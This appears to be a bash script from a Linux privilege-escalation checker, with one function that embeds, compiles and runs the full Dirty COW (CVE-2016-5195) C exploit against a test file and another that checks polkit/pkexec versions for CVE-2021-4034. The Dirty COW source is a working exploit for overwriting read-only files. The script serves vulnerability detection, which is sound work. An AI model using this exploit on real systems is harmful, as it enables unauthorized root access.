#!/bin/bash

cve_2016_5195() {
    (cat << EOF
/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test > foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -pthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map;
int f;
struct stat st;
char *name;
 
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}
 
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,(uintptr_t) map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}
 
 
int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc<3) {
  (void)fprintf(stderr, "%s\n",
      "usage: dirtyc0w target_file new_content");
  return 1; }
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %zx\n\n",(uintptr_t) map);
/*
You have to do it on two threads.
*/
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
EOF
) > exploit.c

    gcc -pthread exploit.c -o exploit

    echo not_vulnerable > exploit_test
    timeout 5 ./exploit exploit_test vulnerable &>/dev/null

    if [ "$(cat exploit_test)" == "vulnerable" ]; then
        echo "Vulnerable to CVE-2016-5195"
    fi
}

cve_2021_4034() { #(
  local vulnerable=false
  local pkexec
  local pkexec_version
  local distro_release
  local package_version
  local package_fixed
  pkexec=$(command -v pkexec)
  package_version=$(lse_get_pkg_version polkit)
  if [ -n "$pkexec" ] && stat -c'%A' "$pkexec" | grep -Eq -- '^-..s.+'; then
    vulnerable=true
    pkexec_version=$(pkexec --version | grep -Eo '[0-9\.]+')
    if lse_is_version_bigger "$pkexec_version" 0.120 ; then
      # Not Vulnerable
      exit 1
    fi
    case "$lse_distro_codename" in
      ubuntu|debian)
        [ -r "/etc/os-release" ] && distro_release=$(grep -E '^VERSION_CODENAME=' /etc/os-release | cut -f2 -d=)
        package_version=$(lse_get_pkg_version policykit-1)
        case "$distro_release" in
          bionic)
            package_fixed="0.105-20ubuntu0.18.04.6"
            ;;
          focal)
            package_fixed="0.105-26ubuntu1.2"
            ;;
          impish)
            package_fixed="0.105-31ubuntu0.1"
            ;;
          trusty)
            package_fixed="0.105-4ubuntu3.14.04.6+esm1"
            ;;
          xenial)
            package_fixed="0.105-14.1ubuntu0.5+esm1"
            ;;
          stretch)
            package_fixed="0.105-18+deb9u2"
            ;;
          buster)
            package_fixed="0.105-25+deb10u1"
            ;;
          bullseye)
            package_fixed="0.105-31+deb11u1"
            ;;
          *) # Future releases (bookworm+ and jammy+). This is because debian derivates use a polkit fork from version 0.105.
            package_fixed="0.105-33"
            ;;
        esac
        ;;
      redhat)
        [ -r "/etc/os-release" ] && distro_release=$(grep -E '^VERSION_ID=' /etc/os-release | cut -f2 -d=)
        case "$distro_release" in
          6.*)
            package_fixed="0.96-11.el6_10.2"
            ;;
          7.3)
            package_fixed="0.112-12.el7_3.1"
            ;;
          7.4)
            package_fixed="0.112-12.el7_4.2"
            ;;
          7.6)
            package_fixed="0.112-18.el7_6.3"
            ;;
          7.7)
            package_fixed="0.112-22.el7_7.2"
            ;;
          7.*)
            package_fixed="0.112-26.el7_9.1"
            ;;
          8.1)
            package_fixed="0.115-9.el8_1.2"
            ;;
          8.2)
            package_fixed="0.115-11.el8_2.2"
            ;;
          8.4)
            package_fixed="0.115-11.el8_4.2"
            ;;
          8.*)
            package_fixed="0.115-13.el8_5.1"
            ;;
          *)
            lse_is_version_bigger "$distro_release" 8 && exit 1
            ;;
        esac
        ;;
      rocky)
        [ -r "/etc/os-release" ] && distro_release=$(grep -E '^VERSION_ID=' /etc/os-release | cut -f2 -d=)
        case "$distro_release" in
          8.5)
            package_fixed="0.115-13.el8_5.1"
            ;;
        esac
        ;;
      opsuse)
        [ -r "/etc/os-release" ] && distro_release=$(grep -E '^VERSION_ID=' /etc/os-release | cut -f2 -d=)
        case "$distro_release" in
          15.3)
            package_fixed="0.116-3.6.1"
            ;;
        esac
        ;;
      fedora)
        [ -r "/etc/os-release" ] && distro_release=$(grep -E '^VERSION_ID=' /etc/os-release | cut -f2 -d=)
        case "$distro_release" in
          34)
            package_fixed="0.117-3.fc34.2"
            ;;
          35)
            package_fixed="0.120-1.fc35.1"
            ;;
          36)
            package_fixed="0.120-3.fc36"
            ;;
          *)
            [ $((distro_release)) -gt 36 ] && exit 1
            ;;
        esac
        ;;
    esac
    if [ -n "$package_fixed" ] && [ -n "$package_version" ] && ! lse_is_version_bigger "$package_fixed" "$package_version"; then
      # Not Vulnerable
      exit 1
    fi
  fi
  $vulnerable && echo "Vulnerable! polkit version: ${package_version:-$pkexec_version}"
} #)